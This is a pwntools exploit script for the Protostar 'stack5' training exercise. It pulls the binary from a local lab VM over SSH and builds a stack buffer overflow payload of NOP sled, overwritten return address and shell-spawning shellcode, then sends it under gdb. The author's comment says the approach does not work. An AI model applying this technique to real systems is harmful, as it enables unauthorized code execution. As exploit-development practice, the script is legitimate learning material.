import os, sys, subprocess
from pwn import *

context(arch='i386', os='linux')

shell = ssh(host='192.168.94.129', user='user', password='user', port=22)
shell.download_file('/opt/protostar/bin/stack5', './bin/stack5')
if not os.access('./bin/stack5', os.X_OK):
    subprocess.call('chmod +x ./bin/stack5', shell=True)

eip = 0xffffcfdc
buff = 0xffffcf90
offset = eip - buff #76

# create shellcode which spawns a shell
shellcode = shellcraft.i386.linux.sh()
shell_asm = asm(shellcode)
shellcode_size = len(shell_asm)

log.info('Shellcode: {}'.format(shellcode))
log.info('Hexdump: {}'.format(hexdump(shell_asm)))
log.info('Shellcode size: {} bytes'.format(shellcode_size))

junk = '\x90'*offset
eip = p32(0xffffcfe0, endian='little') # point somewhere into the nop slide
# -.- this does not work
nops = '\x90'*100
payload = junk + eip + nops + shell_asm

#p = process('./bin/stack5')
p = gdb.debug('./bin/stack5', '''
        break *0x080483d9
        continue
        ''')
log.info('Sending payload {}'.format(repr(payload)))
p.sendline(payload)
p.interactive()
